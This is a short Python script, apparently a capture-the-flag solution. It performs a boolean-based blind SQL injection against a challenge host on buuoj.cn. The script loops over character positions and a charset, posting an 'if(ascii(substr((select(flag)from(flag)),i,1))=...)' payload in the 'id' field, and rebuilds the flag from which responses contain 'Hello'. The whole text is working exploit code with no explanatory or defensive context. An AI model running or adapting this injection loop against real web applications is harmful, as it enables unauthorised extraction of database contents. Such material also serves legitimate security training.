import requests

s=requests.session()
flag = ''
for i in range(1,50):
    for j in '-{abcdefghijklmnopqrstuvwxyz0123456789}':
        url="http://ad5ed2b5-7482-4608-bdfb-6b5f5d8ac62f.node3.buuoj.cn/index.php"
        sqls="if(ascii(substr((select(flag)from(flag)),{},1))=ascii('{}'),1,2)".format(i,j)
        data={"id":sqls}
        c = s.post(url,data=data,timeout=10)
        if 'Hello' in c.text:
            flag += j
            print(flag)
            break
